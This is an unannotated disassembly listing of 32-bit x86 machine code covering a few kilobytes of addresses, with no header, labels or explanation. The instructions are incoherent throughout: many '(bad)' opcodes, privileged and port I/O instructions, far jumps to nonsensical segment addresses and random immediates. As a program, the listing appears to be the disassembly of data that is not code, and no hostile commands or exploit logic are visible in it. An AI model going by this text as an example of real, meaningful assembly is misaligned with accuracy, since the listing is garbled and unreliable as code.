  42479a:	sub    al,0x4a
  42479c:	retf   
  42479d:	mov    eax,0xb1773526
  4247a2:	sbb    edi,DWORD PTR [edx]
  4247a4:	add    ebx,eax
  4247a6:	fnstsw WORD PTR [esi-0x3c48148a]
  4247ac:	test   eax,0xbacf354c
  4247b1:	mov    dh,BYTE PTR [esi-0x2f]
  4247b4:	cli    
  4247b5:	std    
  4247b6:	mov    esp,0x4e40dc1a
  4247bb:	rcl    DWORD PTR [ecx-0x10],cl
  4247be:	popf   
  4247bf:	(bad)  
  4247c0:	adc    DWORD PTR [edx],ebx
  4247c2:	mov    bl,0xc7
  4247c4:	xchg   ebx,eax
  4247c5:	push   0xffffff80
  4247c7:	sbb    DWORD PTR [eax],ebx
  4247c9:	pop    edx
  4247ca:	sbb    eax,0x17501bd
  4247cf:	inc    ecx
  4247d0:	pop    esi
  4247d1:	cs repz xchg esp,eax
  4247d4:	cmp    BYTE PTR [ebp-0x7b096246],dh
  4247da:	xchg   ebp,eax
  4247db:	enter  0x5ead,0x78
  4247df:	fs ret 0x5f35
  4247e3:	sbb    edi,ebx
  4247e5:	out    dx,al
  4247e6:	js     0x424834
  4247e8:	leave  
  4247e9:	stc    
  4247ea:	test   DWORD PTR [eax+0x23],edi
  4247ed:	mov    cl,0x9e
  4247ef:	jns    0x4247dc
  4247f1:	sbb    ebx,0x998dac4d
  4247f7:	lea    ecx,ds:0xd214fbd8
  4247fd:	add    DWORD PTR [esi+0x40b0525a],edx
  424803:	outs   dx,BYTE PTR ds:[esi]
  424804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424805:	dec    ebx
  424806:	mov    ebp,0xfa6f37fe
  42480b:	popa   
  42480c:	pop    ds
  42480d:	(bad)  [edi-0x19b09632]
  424813:	dec    edx
  424814:	js     0x424846
  424816:	inc    DWORD PTR [edx-0x28238d8b]
  42481c:	push   0xffffffcc
  42481e:	ins    BYTE PTR es:[edi],dx
  42481f:	or     cl,dh
  424821:	and    ah,dl
  424823:	push   eax
  424824:	adc    DWORD PTR [edi],esp
  424826:	inc    esi
  424827:	shl    ebp,cl
  424829:	les    esi,FWORD PTR [ebx-0x5d]
  42482c:	add    DWORD PTR [ecx+0x1f],eax
  42482f:	cmp    DWORD PTR [edi],eax
  424831:	mov    ds:0xadc3862e,eax
  424836:	jne    0x4247eb
  424838:	pusha  
  424839:	retfw  
  42483b:	aad    0x18
  42483d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42483e:	ds jno 0x4247da
  424841:	adc    ecx,edx
  424843:	aad    0x18
  424845:	lds    esi,FWORD PTR [edx+0x6186eaaf]
  42484b:	mov    cx,cx
  42484e:	mov    dh,0x5e
  424850:	cli    
  424851:	cld    
  424852:	mov    ds:0x2a152edc,eax
  424857:	js     0x4248b5
  424859:	into   
  42485a:	xchg   esi,eax
  42485b:	bound  edx,QWORD PTR [esi+0xfb8566b]
  424861:	fld    TBYTE PTR [ecx+ecx*8-0x65109f16]
  424868:	xlat   BYTE PTR es:[ebx]
  42486a:	lds    edi,FWORD PTR cs:[esi]
  42486d:	ins    BYTE PTR es:[edi],dx
  42486e:	imul   eax,DWORD PTR [eax],0x1f
  424871:	sbb    dl,BYTE PTR ds:0x7bad6c5b
  424877:	into   
  424878:	or     DWORD PTR [ebx],ebx
  42487a:	push   ebx
  42487b:	adc    BYTE PTR [edx-0x14],dh
  42487e:	add    eax,0xe672026c
  424883:	pop    esi
  424884:	xor    al,0xae
  424886:	jae    0x4248a2
  424888:	jne    0x42484a
  42488a:	sbb    ebp,DWORD PTR [edx+ebp*8]
  42488d:	scas   al,BYTE PTR es:[edi]
  42488e:	xchg   ebp,eax
  42488f:	and    al,0x7e
  424891:	test   al,0xff
  424893:	pop    esi
  424894:	cmp    dl,0x9a
  424897:	sub    al,0x64
  424899:	cmp    bh,cl
  42489b:	or     eax,0x90698587
  4248a0:	push   cs
  4248a1:	test   BYTE PTR [ebx-0x7916414e],bh
  4248a7:	jbe    0x4248a9
  4248a9:	push   ebx
  4248aa:	adc    DWORD PTR [ebx],edx
  4248ac:	fldlg2 
  4248ae:	lock call 0xb620:0x8c56e410
  4248b6:	inc    edx
  4248b7:	sbb    eax,DWORD PTR [ebx-0x6d8ab64b]
  4248bd:	pop    es
  4248be:	into   
  4248bf:	inc    eax
  4248c0:	lock lea esi,[esi+0x7c1e8354]
  4248c7:	inc    ebp
  4248c8:	test   BYTE PTR [ebx-0x5e],dl
  4248cb:	jmp    0x18a94b63
  4248d0:	xchg   edi,eax
  4248d1:	fbstp  TBYTE PTR [edi]
  4248d3:	and    BYTE PTR [ebx],dh
  4248d5:	mov    esi,DWORD PTR [ecx-0x25587920]
  4248db:	sub    cl,bl
  4248dd:	xor    eax,edx
  4248df:	ret    
  4248e0:	(bad)  
  4248e1:	cwde   
  4248e2:	je     0x424869
  4248e4:	ins    DWORD PTR es:[edi],dx
  4248e5:	sub    esi,DWORD PTR [ebx]
  4248e7:	punpcklbw xmm6,xmm6
  4248eb:	(bad)
  4248ef:	int    0x6b
  4248f1:	and    DWORD PTR [eax-0xc4cd3ae],edx
  4248f7:	(bad)  
  4248f8:	jmp    0x6acb:0xe4186a4b
  4248ff:	inc    ecx
  424900:	cmc    
  424901:	lds    ecx,FWORD PTR [ebx+0x165fc7f5]
  424907:	mov    ch,0xdf
  424909:	jmp    0x54aa:0x820acd05
  424910:	adc    eax,0xb16f3211
  424915:	adc    al,BYTE PTR [edx+0x61]
  424918:	ret    
  424919:	leave  
  42491a:	sbb    DWORD PTR [eax+edi*2],0x7f
  42491e:	add    edi,DWORD PTR [eax+0x57]
  424921:	push   ebp
  424922:	mov    ebx,ecx
  424924:	mov    ah,0x7
  424926:	jp     0x4248d5
  424928:	dec    edx
  424929:	out    0x45,al
  42492b:	or     BYTE PTR [esp+eiz*8],0xee
  42492f:	jl     0x4248d8
  424931:	and    eax,0xf2e4bf34
  424936:	cmc    
  424937:	jbe    0x424950
  424939:	out    dx,eax
  42493a:	fs mov edx,0x3a3d6200
  424940:	bswap  esp
  424942:	xchg   DWORD PTR [esi],esp
  424944:	sub    DWORD PTR [esp+ebx*8],ebp
  424947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424948:	dec    esi
  424949:	sub    eax,0x11c37d0
  42494e:	xor    dh,BYTE PTR [esi+ecx*4]
  424951:	sub    al,0xbe
  424953:	mov    bh,0x58
  424955:	push   cs
  424956:	or     DWORD PTR [edi+0x4ee17ff8],ebp
  42495c:	clc    
  42495d:	jnp    0x424949
  42495f:	sbb    esi,0xffffffb8
  424962:	push   edx
  424963:	imul   ebx,ecx,0xffffffcf
  424966:	je     0x42492d
  424968:	hlt    
  424969:	aas    
  42496a:	or     DWORD PTR [edx+0xdccb08b],eax
  424970:	add    dh,BYTE PTR [ebp-0x4a]
  424973:	and    ch,ch
  424975:	pop    ebx
  424976:	sub    al,0xa3
  424978:	mov    esi,0x2d5f2c12
  42497d:	call   0x9e06:0xb9261a0c
  424984:	mov    ebp,0xbdbf878a
  424989:	gs (bad) 
  42498b:	mov    ebp,0xdd9db7b6
  424990:	inc    ebx
  424991:	sti    
  424992:	cmp    eax,0xeb01e70a
  424997:	cdq    
  424998:	dec    esp
  424999:	arpl   WORD PTR [eax-0x2],bx
  42499c:	lea    ebx,[esp+ebx*4]
  42499f:	popf   
  4249a0:	pop    ds
  4249a1:	ja     0x424984
  4249a3:	inc    ecx
  4249a4:	in     eax,0xde
  4249a6:	sbb    DWORD PTR [edx],eax
  4249a8:	jmp    0x779f:0xde9741a2
  4249af:	icebp  
  4249b0:	sub    DWORD PTR [edi-0x71756d7e],ecx
  4249b6:	mov    cl,0x6c
  4249b8:	dec    eax
  4249b9:	test   al,0x3b
  4249bb:	ret    0x7fa0
  4249be:	add    eax,0xd2d0e849
  4249c3:	sub    al,BYTE PTR [eax-0x1a]
  4249c6:	pop    ebx
  4249c7:	mov    edi,0xc3fc6649
  4249cc:	inc    ebp
  4249cd:	mov    cl,0x1a
  4249cf:	or     eax,ebp
  4249d1:	scas   eax,DWORD PTR es:[edi]
  4249d2:	sbb    dh,dl
  4249d4:	pop    es
  4249d5:	ins    WORD PTR es:[edi],dx
  4249d7:	pop    ecx
  4249d8:	sahf   
  4249d9:	das    
  4249da:	loopne 0x424a18
  4249dc:	pop    esp
  4249dd:	mov    eax,ds:0x474650d4
  4249e2:	leave  
  4249e3:	iret   
  4249e4:	(bad)  
  4249e5:	jle    0x42498d
  4249e7:	mov    cl,0x6e
  4249e9:	inc    esi
  4249ea:	xchg   ebp,eax
  4249eb:	sub    BYTE PTR cs:[edx+0x4a],al
  4249ef:	or     ebp,0x55b4b62a
  4249f5:	hlt    
  4249f6:	xor    DWORD PTR [esi-0x5e94e6f],esi
  4249fc:	lea    eax,[eax]
  4249fe:	scas   eax,DWORD PTR es:[edi]
  4249ff:	push   ss
  424a00:	lea    ecx,[ebp-0x109cd534]
  424a06:	fwait
  424a07:	pop    es
  424a08:	mov    esi,0xfee5617
  424a0d:	or     ebp,DWORD PTR [esi+esi*8-0x2e]
  424a11:	pushf  
  424a12:	mov    dh,BYTE PTR [edi]
  424a14:	mov    ah,0x65
  424a16:	test   dh,0x8f
  424a19:	cwde   
  424a1a:	pop    esp
  424a1b:	repz imul edi,DWORD PTR [ebx],0x5758c395
  424a22:	aam    0x6a
  424a24:	adc    ch,BYTE PTR [edi]
  424a26:	pushf  
  424a27:	sub    dh,BYTE PTR [edx+0x52]
  424a2a:	pop    ecx
  424a2b:	jbe    0x424a46
  424a2d:	push   esi
  424a2e:	cmp    eax,0x267e5a5d
  424a33:	aad    0x86
  424a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a36:	pop    edi
  424a37:	mov    bh,0xb1
  424a39:	mov    al,0x5c
  424a3b:	mov    esi,0x7bd5487f
  424a40:	adc    DWORD PTR [edi-0x2d],ebx
  424a43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a44:	ins    DWORD PTR es:[edi],dx
  424a45:	out    dx,eax
  424a46:	ss pop esi
  424a48:	mov    dh,0x80
  424a4a:	adc    ecx,DWORD PTR [edx-0x2c]
  424a4d:	inc    ebp
  424a4e:	sbb    ch,al
  424a50:	ret    
  424a51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a52:	jmp    0x9e2c:0x7be3d8bf
  424a59:	neg    edi
  424a5b:	sub    BYTE PTR gs:[ebx],0x26
  424a5f:	cmp    al,BYTE PTR [esi-0x7b]
  424a62:	adc    BYTE PTR [eax],al
  424a64:	add    BYTE PTR [eax],al
  424a66:	add    BYTE PTR [eax],al
  424a68:	add    BYTE PTR [eax],al
  424a6a:	push   edx
  424a6b:	inc    ecx
  424a6c:	push   esp
  424a6d:	push   edx
  424a6e:	push   edi
  424a6f:	push   edi
  424a70:	push   esi
  424a71:	inc    ecx
  424a72:	ror    DWORD PTR [ebx-0x49],1
  424a75:	popf   
  424a76:	mov    esp,0x5ec415b6
  424a7b:	fadd   DWORD PTR [ecx]
  424a7d:	add    BYTE PTR [ecx+0x6000006],al
  424a83:	inc    ebx
  424a84:	add    DWORD PTR [edi*4+0x1a714e08],ecx
  424a8b:	out    dx,al
  424a8c:	clc    
  424a8d:	mov    al,0x2
  424a8f:	jecxz  0x424b03
  424a91:	jge    0x424a5a
  424a93:	mov    ecx,DWORD PTR [edi+esi*1]
  424a96:	push   0x54
  424a98:	aam    0x17
  424a9a:	test   al,0xd4
  424a9c:	cmp    al,0x2b
  424a9e:	and    BYTE PTR [ecx+eax*8+0x2b],dl
  424aa2:	xchg   ecx,eax
  424aa3:	aam    0xba
  424aa5:	int3   
  424aa6:	mov    eax,ds:0xf2ffbb8b
  424aab:	jmp    0xa1d9:0x7377197e
  424ab2:	mov    edx,DWORD PTR [edi+0x78624058]
  424ab8:	hlt    
  424ab9:	dec    ecx
  424aba:	cdq    
  424abb:	and    eax,0xdd4a6997
  424ac0:	(bad)  
  424ac1:	mov    ?,WORD PTR [esp+ecx*1+0x6e]
  424ac5:	xlat   BYTE PTR ds:[ebx]
  424ac6:	in     al,0xe0
  424ac8:	test   al,0x79
  424aca:	xchg   ebx,eax
  424acb:	clc    
  424acc:	jmp    0x424ac6
  424ace:	loope  0x424b12
  424ad0:	or     dl,BYTE PTR [edx-0x5bc79a92]
  424ad6:	cmp    eax,0x85b223e
  424adb:	lds    esi,FWORD PTR [esi-0x32d9cf89]
  424ae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ae2:	cmp    edi,edx
  424ae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ae5:	loopne 0x424ad0
  424ae7:	jmp    0x424aed
  424ae9:	mov    ebp,0x8cce460d
  424aee:	fcmovnbe st,st(7)
  424af0:	stos   DWORD PTR es:[edi],eax
  424af1:	dec    eax
  424af2:	repnz sub al,0xc3
  424af5:	or     ebp,DWORD PTR [esi-0x39]
  424af8:	data16 jno 0x424b01
  424afb:	dec    eax
  424afc:	and    BYTE PTR [eax+ebx*8+0x6fdf30ec],0x10
  424b04:	jmp    0x9f9b:0xaa42fea8
  424b0b:	addr16 inc edi
  424b0d:	pop    es
  424b0e:	shr    DWORD PTR [ebx-0x7b],cl
  424b11:	xchg   esp,eax
  424b12:	add    esi,esp
  424b14:	mov    al,0xd4
  424b16:	out    dx,eax
  424b17:	stos   DWORD PTR es:[edi],eax
  424b18:	pop    es
  424b19:	jb     0x424b66
  424b1b:	retf   0x9366
  424b1e:	jns    0x424b8a
  424b20:	pop    esi
  424b21:	aaa    
  424b22:	mov    ebx,0xdf847d86
  424b27:	sbb    DWORD PTR [ebx],ebx
  424b29:	xchg   esi,eax
  424b2a:	leave  
  424b2b:	mov    eax,0xac70b8b1
  424b30:	jne    0x424aea
  424b32:	test   BYTE PTR [edx+esi*1],0x9a
  424b36:	xchg   edx,eax
  424b37:	sbb    eax,0x1b34e16c
  424b3c:	in     al,dx
  424b3d:	enter  0x2c2f,0x34
  424b41:	(bad)  
  424b42:	out    dx,eax
  424b43:	push   esi
  424b44:	jmp    0x424bb2
  424b46:	les    edx,FWORD PTR [edx-0x12]
  424b49:	pop    esi
  424b4a:	lods   al,BYTE PTR ds:[esi]
  424b4b:	icebp  
  424b4c:	inc    edi
  424b4d:	cmp    eax,0x372fda02
  424b52:	cmp    al,0x92
  424b54:	sub    eax,0xef19aae7
  424b59:	and    al,0x2b
  424b5b:	push   ebp
  424b5c:	call   0x9cbf:0x4761463c
  424b63:	pop    esp
  424b64:	jae    0x424b89
  424b66:	test   cl,0xec
  424b69:	icebp  
  424b6a:	scas   al,BYTE PTR es:[edi]
  424b6b:	(bad)  
  424b6c:	std    
  424b6d:	(bad)  
  424b6e:	out    0xe1,eax
  424b70:	sub    cl,ch
  424b72:	mov    ecx,eax
  424b74:	in     al,0x4
  424b76:	scas   al,BYTE PTR es:[edi]
  424b77:	mov    DWORD PTR [ebp+0x1d98c534],0xb07613c7
  424b81:	ja     0x424b35
  424b83:	lock mov cl,0x7f
  424b86:	and    edi,DWORD PTR [eax]
  424b88:	sti    
  424b89:	pop    ecx
  424b8a:	and    al,0xfb
  424b8c:	in     eax,0x19
  424b8e:	mov    ebp,0x99a75fbe
  424b93:	repz lock pop es
  424b96:	cmp    al,BYTE PTR [eiz*2-0x31bb323c]
  424b9d:	jns    0x424be5
  424b9f:	sbb    edx,ecx
  424ba1:	push   0x63c99f8e
  424ba6:	ins    BYTE PTR es:[edi],dx
  424ba7:	idiv   BYTE PTR [edx]
  424ba9:	push   0xffffffea
  424bab:	std    
  424bac:	and    eax,0x572bcbbc
  424bb1:	sub    BYTE PTR [esi],al
  424bb3:	mov    al,0xd8
  424bb5:	and    BYTE PTR [esi-0x1a87b386],ah
  424bbb:	leave  
  424bbc:	mov    edi,ecx
  424bbe:	add    al,0x5c
  424bc0:	sbb    ah,dh
  424bc2:	or     eax,0xc2c16c47
  424bc7:	sbb    al,0xee
  424bc9:	cmovno ebx,DWORD PTR [esi]
  424bcc:	retf   
  424bcd:	ret    0xfd89
  424bd0:	sbb    cl,BYTE PTR es:[eax-0x7a2bdbd1]
  424bd7:	xchg   edi,eax
  424bd8:	pop    edx
  424bd9:	xor    edx,esp
  424bdb:	ror    DWORD PTR [eax],0x91
  424bde:	xchg   ebx,eax
  424bdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424be0:	xchg   ebp,eax
  424be1:	mov    DWORD PTR [edx-0x28f10e41],esi
  424be7:	push   esi
  424be8:	jecxz  0x424b89
  424bea:	out    dx,eax
  424beb:	dec    ebp
  424bec:	xlat   BYTE PTR ds:[ebx]
  424bed:	bound  esp,QWORD PTR [eax]
  424bef:	in     eax,dx
  424bf0:	ficomp DWORD PTR [eax+ecx*1]
  424bf3:	and    eax,0xd7cfc656
  424bf8:	jecxz  0x424bdb
  424bfa:	adc    esp,DWORD PTR [esi+0x51dfe167]
  424c00:	add    ah,bl
  424c02:	and    bl,ah
  424c04:	out    0x98,al
  424c06:	push   ss
  424c07:	enter  0x5339,0xdb
  424c0b:	or     eax,0x51d8652d
  424c10:	into   
  424c11:	add    BYTE PTR [eax-0x54de8397],bl
  424c17:	(bad)
  424c1a:	(bad)  
  424c1b:	pushf  
  424c1c:	or     cl,BYTE PTR ds:0x24b0818
  424c22:	mov    eax,0xf2f763c8
  424c27:	out    dx,al
  424c28:	mov    edx,0x99071c9
  424c2d:	retf   0xad4a
  424c30:	push   eax
  424c31:	mov    al,0x32
  424c33:	jecxz  0x424c54
  424c35:	pop    edx
  424c36:	lahf   
  424c37:	(bad)  
  424c38:	push   esi
  424c39:	popa   
  424c3a:	cmp    bh,BYTE PTR [esi-0x299844a8]
  424c40:	lods   al,BYTE PTR ds:[esi]
  424c41:	sbb    eax,0x57c82448
  424c46:	je     0x424c79
  424c48:	daa    
  424c49:	int3   
  424c4a:	or     eax,0x969be2c6
  424c4f:	push   edx
  424c50:	cs loopne 0x424c59
  424c53:	cmp    DWORD PTR [ecx+0x5ccb526c],edi
  424c59:	aad    0x85
  424c5b:	add    al,0x3c
  424c5d:	aas    
  424c5e:	je     0x424c65
  424c60:	shr    BYTE PTR [esi-0x244d4f92],0xbd
  424c67:	or     al,BYTE PTR [ecx-0x3b]
  424c6a:	dec    ecx
  424c6b:	mov    ds:0x4e95e2e0,al
  424c70:	add    ch,bl
  424c72:	jb     0x424c60
  424c74:	lods   eax,DWORD PTR ds:[esi]
  424c75:	mov    WORD PTR [ecx-0x4d],cs
  424c78:	ror    dl,cl
  424c7a:	stos   BYTE PTR es:[edi],al
  424c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c7c:	inc    eax
  424c7d:	(bad)  
  424c7e:	test   BYTE PTR ds:[edi-0x32],0x5c
  424c83:	push   ss
  424c84:	xchg   ebp,eax
  424c85:	push   ds
  424c86:	into   
  424c87:	rol    DWORD PTR [ecx+0xa],cl
  424c8a:	jmp    0x20e1:0xf8cf44c5
  424c91:	enter  0xc068,0x32
  424c95:	and    DWORD PTR [edi-0x27a6c86],esp
  424c9b:	and    ah,bh
  424c9d:	rol    BYTE PTR [edx+0xc],1
  424ca0:	push   cs
  424ca1:	mov    DWORD PTR [esi],ebx
  424ca3:	mov    bh,0x8e
  424ca5:	sti    
  424ca6:	inc    esi
  424ca7:	sbb    edi,edx
  424ca9:	cld    
  424caa:	jne    0x424d1f
  424cac:	out    0xaa,al
  424cae:	inc    ecx
  424caf:	lahf   
  424cb0:	daa    
  424cb1:	or     DWORD PTR [ebx-0x42dfbd6d],esi
  424cb7:	mov    cs,edi
  424cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424cba:	dec    ebx
  424cbb:	jecxz  0x424cfe
  424cbd:	inc    BYTE PTR [ebx]
  424cbf:	mov    esp,DWORD PTR [ebx-0x948f274]
  424cc5:	dec    edi
  424cc6:	inc    esp
  424cc7:	aas    
  424cc8:	sub    edx,DWORD PTR [esi]
  424cca:	add    DWORD PTR [eax+ebx*2],esi
  424ccd:	jp     0x424cf4
  424ccf:	aaa    
  424cd0:	aam    0x5a
  424cd2:	jp     0x424ca4
  424cd4:	xchg   DWORD PTR [esi+eiz*8-0x28],ecx
  424cd8:	mov    al,ds:0xfad57e72
  424cdd:	push   es
  424cde:	mov    al,0xad
  424ce0:	sbb    dl,BYTE PTR [ebx-0x5a]
  424ce3:	outs   dx,BYTE PTR ds:[esi]
  424ce4:	rol    BYTE PTR [eax+0x4b02cfd2],cl
  424cea:	das    
  424ceb:	cld    
  424cec:	test   al,0xe9
  424cee:	add    DWORD PTR [ecx-0x1d],ebp
  424cf1:	ds es aas 
  424cf4:	dec    al
  424cf6:	xchg   edx,eax
  424cf7:	pop    eax
  424cf8:	addr16 jbe 0x424c9d
  424cfb:	mov    ds:0x51940b8b,eax
  424d00:	shl    ah,cl
  424d02:	add    eax,0x1de8e7ca
  424d07:	push   edi
  424d08:	dec    ebp
  424d09:	div    ebx
  424d0b:	or     al,0x8e
  424d0d:	cmp    dl,al
  424d0f:	dec    ecx
  424d10:	sbb    al,0x93
  424d12:	or     ah,BYTE PTR [eax-0x4b8b71bd]
  424d18:	(bad)  
  424d19:	int3   
  424d1a:	pusha  
  424d1b:	add    eax,0x2d6a2c78
  424d20:	mov    ecx,0x511f12ed
  424d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d26:	inc    ebp
  424d27:	js     0x424cd5
  424d29:	add    eax,0x3d1d2155
  424d2e:	mov    ds:0xe9e06f6f,al
  424d33:	dec    edx
  424d34:	(bad)  
  424d35:	out    0x78,eax
  424d37:	sbb    DWORD PTR gs:[esi-0x4a],ebx
  424d3b:	lahf   
  424d3c:	addr16 pop ss
  424d3e:	push   ebp
  424d3f:	sahf   
  424d40:	or     DWORD PTR [edx],ecx
  424d42:	mov    ah,0x74
  424d44:	sbb    DWORD PTR [ebp+0xb8e30cb],eax
  424d4a:	lahf   
  424d4b:	cmp    dl,BYTE PTR [edx-0x4e]
  424d4e:	lea    edi,[eax]
  424d50:	adc    eax,0xbd61e92e
  424d55:	pop    esp
  424d56:	imul   eax,DWORD PTR [eax-0x18c87637],0xfffffffb
  424d5d:	pop    edx
  424d5e:	and    BYTE PTR [edi-0x108352c3],0xdb
  424d65:	mov    DWORD PTR [ecx],ebp
  424d67:	xor    DWORD PTR [edx+edi*1+0x38],ebx
  424d6b:	(bad)  
  424d6c:	push   cs
  424d6d:	call   esp
  424d6f:	int3   
  424d70:	imul   DWORD PTR ds:0xdd1e08cf
  424d76:	or     al,0xce
  424d78:	push   0xfffffff3
  424d7a:	sti    
  424d7b:	cli    
  424d7c:	push   ecx
  424d7d:	pop    es
  424d7e:	pop    ebx
  424d7f:	lods   eax,DWORD PTR ds:[esi]
  424d80:	mov    cl,0x13
  424d82:	ret    
  424d83:	and    dh,BYTE PTR [edx]
  424d85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d86:	pusha  
  424d87:	cs xchg ebx,eax
  424d89:	pop    eax
  424d8a:	push   0xffffffc8
  424d8c:	adc    eax,0x49cea16f
  424d91:	xchg   DWORD PTR [ebx],esi
  424d93:	sub    eax,eax
  424d95:	push   ds
  424d96:	aas    
  424d97:	mov    eax,ds:0x61efa2c2
  424d9c:	mov    al,ds:0x86ee18dd
  424da1:	add    BYTE PTR [eax],cl
  424da3:	(bad)  
  424da4:	sti    
  424da5:	jnp    0x424d92
  424da7:	jmp    FWORD PTR [ebx+0x4]
  424daa:	stos   DWORD PTR es:[edi],eax
  424dab:	jno    0x424d9d
  424dad:	add    dl,dh
  424daf:	xor    eax,0xfeff0c59
  424db4:	call   0xfe28c344
  424db9:	fsub   DWORD PTR [esi-0x75]
  424dbc:	cmp    eax,DWORD PTR [edi+0x74a6029]
  424dc2:	pop    edx
  424dc3:	cmp    al,0x41
  424dc5:	mov    esi,DWORD PTR [edi-0x9]
  424dc8:	mov    ch,0x6c
  424dca:	sub    ch,BYTE PTR [eax]
  424dcc:	ins    BYTE PTR es:[edi],dx
  424dcd:	repnz mov dl,0x1f
  424dd0:	sub    ah,bl
  424dd2:	mov    al,ds:0xb9b34398
  424dd7:	adc    BYTE PTR fs:0xf5f6e6ca,dh
  424dde:	jecxz  0x424e00
  424de0:	test   BYTE PTR [eax],ah
  424de2:	add    ecx,DWORD PTR [esi]
  424de4:	xchg   ecx,eax
  424de5:	pop    ebp
  424de6:	sbb    al,0x7f
  424de8:	or     eax,DWORD PTR [edx+eax*8]
  424deb:	xor    ebx,esp
  424ded:	call   0x81b6:0xeaf9fd12
  424df4:	rcr    DWORD PTR [ecx],1
  424df6:	and    eax,0x153ab175
  424dfb:	cld    
  424dfc:	aaa    
  424dfd:	into   
  424dfe:	xlat   BYTE PTR ds:[ebx]
  424dff:	inc    esp
  424e00:	and    esp,edi
  424e02:	stc    
  424e03:	repnz push edx
  424e05:	xor    ecx,esi
  424e07:	jne    0x424dcb
  424e09:	push   esi
  424e0a:	enter  0xb3f4,0x72
  424e0e:	push   ebx
  424e0f:	push   eax
  424e10:	cmp    bl,dl
  424e12:	std    
  424e13:	leave  
  424e14:	idiv   BYTE PTR [ebp-0x30]
  424e17:	gs xchg edi,eax
  424e19:	pop    eax
  424e1a:	mov    eax,ds:0xa822924f
  424e1f:	add    DWORD PTR [edi-0x22],0x5e9ed847
  424e26:	xabort 0x11
  424e29:	dec    eax
  424e2a:	imul   esp,DWORD PTR [eax+edx*1+0x29],0xd27f257c
  424e32:	mov    ds:0x82d4fbfc,eax
  424e37:	hlt    
  424e38:	loop   0x424e44
  424e3a:	sub    eax,0x4ba4df
  424e3f:	lods   al,BYTE PTR ds:[esi]
  424e40:	aas    
  424e41:	xchg   ecx,eax
  424e42:	mov    esp,DWORD PTR [edi+0x6a]
  424e45:	icebp  
  424e46:	adc    ah,dh
  424e48:	lea    esp,[edx+0x7d]
  424e4b:	fisttp WORD PTR [ebp-0x6db5105d]
  424e51:	jb     0x424e9e
  424e53:	out    0x47,eax
  424e55:	addr16 mov esp,0x5a1e5e56
  424e5b:	xchg   edi,eax
  424e5c:	out    0xad,eax
  424e5e:	(bad)  
  424e5f:	xchg   edi,eax
  424e60:	or     al,0x64
  424e62:	fsub   QWORD PTR [edx]
  424e64:	stc    
  424e65:	add    esp,DWORD PTR [ebp+ecx*1-0x48d070c0]
  424e6c:	leave  
  424e6d:	retf   0xd9e2
  424e70:	sti    
  424e71:	jb     0x424e39
  424e73:	sub    DWORD PTR ds:0x3b673770,edi
  424e79:	(bad)  
  424e7a:	sbb    al,0xc0
  424e7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e7d:	mov    dh,0xec
  424e7f:	cmp    DWORD PTR [edx+0x6f],eax
  424e82:	sbb    BYTE PTR [edx],dh
  424e84:	inc    esp
  424e85:	push   es
  424e86:	sub    dh,BYTE PTR [ebx+edx*1-0x50]
  424e8a:	loope  0x424ec4
  424e8c:	popf   
  424e8d:	push   0x8a0a5a03
  424e92:	aad    0x77
  424e94:	jle    0x424e54
  424e96:	loop   0x424ecc
  424e98:	fldcw  WORD PTR [ecx-0x5febbd41]
  424e9e:	inc    esp
  424e9f:	xor    bl,0x68
  424ea2:	test   DWORD PTR [eax-0x48],ebp
  424ea5:	mov    cl,0x12
  424ea7:	or     ebx,DWORD PTR [esp+edi*4]
  424eaa:	ret    
  424eab:	(bad)  
  424eac:	xor    bl,cl
  424eae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424eaf:	sti    
  424eb0:	jb     0x424eab
  424eb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424eb3:	add    ebp,edx
  424eb5:	adc    ch,BYTE PTR [esi+0x75]
  424eb8:	aad    0xf
  424eba:	aaa    
  424ebb:	mov    esi,0xa5fb74eb
  424ec0:	leave  
  424ec1:	retf   0x14c0
  424ec4:	je     0x424f40
  424ec6:	sbb    ecx,ecx
  424ec8:	inc    ecx
  424ec9:	(bad)  
  424eca:	(bad)  
  424ecb:	sub    al,0x58
  424ecd:	and    DWORD PTR [ebp-0x52],esi
  424ed0:	das    
  424ed1:	add    eax,0xcd798dcc
  424ed6:	adc    eax,0x3f71d81c
  424edb:	push   edx
  424edc:	js     0x424f12
  424ede:	mov    ebx,0x90a8d1e7
  424ee3:	inc    esp
  424ee4:	psubb  mm1,QWORD PTR [ebx+0x39]
  424ee8:	or     eax,0x17040c36
  424eed:	pop    ss
  424eee:	retf   
  424eef:	inc    edi
  424ef0:	or     eax,0xf62d5710
  424ef5:	sub    BYTE PTR [edx],al
  424ef7:	xchg   ebp,eax
  424ef8:	add    eax,0xd9e6928b
  424efd:	div    BYTE PTR [esi+0x45963f72]
  424f03:	jo     0x424eb1
  424f05:	data16 xlat BYTE PTR gs:[ebx]
  424f08:	mov    esp,0xf035ae73
  424f0d:	(bad)  [edx-0x3a]
  424f10:	(bad)  
  424f11:	js     0x424f03
  424f13:	mov    ah,0xfa
  424f15:	xchg   BYTE PTR [eax],bl
  424f17:	mov    ebx,0xe8c18338
  424f1c:	imul   ecx,DWORD PTR [esi+0x79],0xa9af2a8e
  424f23:	in     eax,dx
  424f24:	cdq    
  424f25:	xchg   esp,eax
  424f26:	js     0x424f35
  424f28:	jp     0x424f81
  424f2a:	out    0x33,al
  424f2c:	push   cs
  424f2d:	in     eax,0xde
  424f2f:	inc    edi
  424f30:	push   edx
  424f31:	popa   
  424f32:	icebp  
  424f33:	sbb    esp,ebp
  424f35:	xchg   ecx,eax
  424f36:	inc    edx
  424f37:	add    ebx,eax
  424f39:	xor    DWORD PTR ds:0x6c1da007,ebx
  424f3f:	pushf  
  424f40:	push   ss
  424f41:	jb     0x424f48
